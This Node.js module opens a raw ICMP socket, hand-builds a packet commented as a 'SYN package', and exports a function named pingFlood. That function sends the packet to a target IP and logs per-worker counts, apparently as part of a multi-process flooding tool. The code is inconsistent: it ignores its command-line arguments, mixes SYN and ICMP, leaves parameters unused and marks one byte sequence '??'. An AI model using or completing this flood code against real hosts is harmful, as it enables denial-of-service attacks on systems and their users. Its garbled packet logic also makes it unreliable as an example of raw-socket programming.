var raw = require('raw-socket');
if (process.argv.length < 5) {
    console.log("node ping <target> <count> <sleep-milliseconds>");
    process.exit(-1);
}
var target = '127.0.0.1';
var count = 10;
var sleep = 1000;
var options = {
    protocol: raw.Protocol.ICMP
};
var socket = raw.createSocket(options);
socket.on("close", function () {
    console.log("socket closed");
    process.exit(-1);
});
socket.on("error", function (error) {
    console.log("error: " + error.toString());
    process.exit(-1);
});
socket.on("message", function (buffer, source) {
    console.log("received " + buffer.length + " bytes from " + source);
    console.log("data: " + buffer.toString("hex"));
});
// SYN package
var buffer = new Buffer([
    0x00, 0x00,
    0x00, 0x00,
    0x0d, 0xf4, 0xf0, 0xfd,
    0x0f, 0x00, 0xf2, 0x00,
    0x69,
    0x02,
    0x04, 0x00,
    0x00, 0x00,
    0x00, 0x00,
    0x02, 0x04, 0x05, 0xb4,
    0x00, 0x00, 0x00, 0x00 // ??
]);
raw.writeChecksum(buffer, 2, raw.createChecksum(buffer));

function pingFlood(ip, port, timeout, pid) {

    return new Promise((resolve, reject) => {
        socket.send(buffer, 0, buffer.length, ip, function (error, bytes) {
            if (error) {
                console.log(error.toString());
                reject(error);
            } else {
                console.log('Worker pid: ' + pid + ' sent package PING with ' + bytes + ' bytes to ' + ip + ':' + port);
                resolve(bytes);
            }
        });
    });
}
module.exports = pingFlood;
